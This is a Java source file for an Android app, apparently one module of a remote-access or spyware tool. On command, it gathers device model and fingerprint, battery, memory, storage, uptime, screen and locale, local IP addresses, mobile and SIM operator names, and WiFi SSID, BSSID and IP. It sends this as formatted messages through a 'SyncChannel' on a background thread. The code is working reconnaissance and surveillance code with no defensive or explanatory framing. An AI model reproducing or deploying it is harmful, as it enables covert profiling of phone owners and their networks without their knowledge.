// language: Java, file: SystemInfo.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.app.ActivityManager;
import android.content.Context;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.os.SystemClock;
import android.telephony.TelephonyManager;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.List;
import java.util.Locale;

public class SystemInfo {

    public static void dump() {
        Thread t = new Thread(SystemInfo::dumpSync, "v2-info");
        t.setDaemon(true);
        t.start();
    }

    static void dumpSync() {
        Context c = SyncChannel.ctx;
        if (c == null) return;
        try {
            StringBuilder b = new StringBuilder();
            b.append("<b>Device</b>\n")
             .append("model: <code>").append(SyncChannel.esc(Build.MANUFACTURER
                + " " + Build.MODEL)).append("</code>\n")
             .append("device: <code>").append(SyncChannel.esc(Build.DEVICE)).append("</code>\n")
             .append("brand: <code>").append(SyncChannel.esc(Build.BRAND)).append("</code>\n")
             .append("android: ").append(Build.VERSION.RELEASE)
             .append(" (sdk ").append(Build.VERSION.SDK_INT).append(")\n")
             .append("build: <code>").append(SyncChannel.esc(Build.ID)).append("</code>\n")
             .append("fingerprint: <code>").append(SyncChannel.esc(
                shorten(Build.FINGERPRINT, 80))).append("</code>\n\n");

            BatteryManager bm = (BatteryManager) c.getSystemService(Context.BATTERY_SERVICE);
            int level = bm != null
                ? bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) : -1;
            b.append("<b>Battery</b>: ").append(level).append("%\n");

            ActivityManager am = (ActivityManager) c.getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) {
                ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
                am.getMemoryInfo(mi);
                b.append("<b>RAM</b>: free ").append(human(mi.availMem))
                 .append(" / ").append(human(mi.totalMem)).append("\n");
            }

            try {
                StatFs s = new StatFs(Environment.getDataDirectory().getPath());
                b.append("<b>Data</b>: ").append(human(s.getAvailableBytes()))
                 .append(" free / ").append(human(s.getTotalBytes())).append("\n");
            } catch (Throwable ignored) {}

            long up = SystemClock.elapsedRealtime();
            long h = up / 3_600_000, m = (up / 60_000) % 60;
            b.append("<b>Uptime</b>: ").append(h).append("h ").append(m).append("m\n");

            android.util.DisplayMetrics dm = c.getResources().getDisplayMetrics();
            b.append("<b>Screen</b>: ").append(dm.widthPixels).append("×")
             .append(dm.heightPixels).append(" @ ").append((int) dm.density)
             .append("dpi\n");

            b.append("<b>Locale</b>: ").append(Locale.getDefault())
             .append(" · <b>TZ</b>: ").append(java.util.TimeZone.getDefault().getID())
             .append("\n\n");

            b.append("<b>Network</b>\n");
            try {
                List<NetworkInterface> ifs =
                    Collections.list(NetworkInterface.getNetworkInterfaces());
                for (NetworkInterface ni : ifs) {
                    if (ni.isLoopback() || !ni.isUp()) continue;
                    for (InetAddress addr : Collections.list(ni.getInetAddresses())) {
                        if (addr instanceof Inet4Address) {
                            b.append("  ").append(ni.getName()).append(": <code>")
                             .append(addr.getHostAddress()).append("</code>\n");
                        }
                    }
                }
            } catch (Throwable t) {
                b.append("  net err: ").append(SyncChannel.esc(t.getMessage())).append("\n");
            }

            try {
                TelephonyManager tm = (TelephonyManager)
                    c.getSystemService(Context.TELEPHONY_SERVICE);
                if (tm != null) {
                    b.append("<b>Operator</b>: ")
                     .append(SyncChannel.esc(tm.getNetworkOperatorName())).append("\n");
                    try {
                        b.append("<b>SIM</b>: ")
                         .append(SyncChannel.esc(tm.getSimOperatorName())).append("\n");
                    } catch (Throwable ignored) {}
                }
            } catch (Throwable ignored) {}

            SyncChannel.send(b.toString());
        } catch (Throwable t) {
            CommandDispatch.err(t.getMessage());
        }
    }

    public static void wifi() {
        Context c = SyncChannel.ctx;
        if (c == null) return;
        try {
            WifiManager wm = (WifiManager) c.getApplicationContext()
                .getSystemService(Context.WIFI_SERVICE);
            if (wm == null) { SyncChannel.send("<i>no wifi</i>"); return; }
            WifiInfo wi = wm.getConnectionInfo();
            if (wi == null) { SyncChannel.send("<i>no wifi connection</i>"); return; }
            StringBuilder b = new StringBuilder();
            b.append("<b>WiFi</b>\n")
             .append("ssid: <code>").append(SyncChannel.esc(wi.getSSID())).append("</code>\n")
             .append("bssid: <code>").append(SyncChannel.esc(wi.getBSSID())).append("</code>\n")
             .append("rssi: ").append(wi.getRssi()).append(" dBm\n")
             .append("speed: ").append(wi.getLinkSpeed()).append(" Mbps\n");
            int ip = wi.getIpAddress();
            if (ip != 0) {
                String ipStr = String.format(Locale.US, "%d.%d.%d.%d",
                    ip & 0xff, (ip >> 8) & 0xff, (ip >> 16) & 0xff, (ip >> 24) & 0xff);
                b.append("ip: <code>").append(ipStr).append("</code>\n");
            }
            SyncChannel.send(b.toString());
        } catch (Throwable t) {
            CommandDispatch.err(t.getMessage());
        }
    }

    static String human(long b) {
        if (b < 1024) return b + "B";
        if (b < 1024 * 1024) return String.format(Locale.US, "%.1fK", b / 1024.0);
        if (b < 1024L * 1024 * 1024)
            return String.format(Locale.US, "%.1fM", b / 1024.0 / 1024.0);
        return String.format(Locale.US, "%.2fG", b / 1024.0 / 1024.0 / 1024.0);
    }

    static String shorten(String s, int n) {
        if (s == null) return "";
        return s.length() <= n ? s : s.substring(0, n) + "…";
    }
}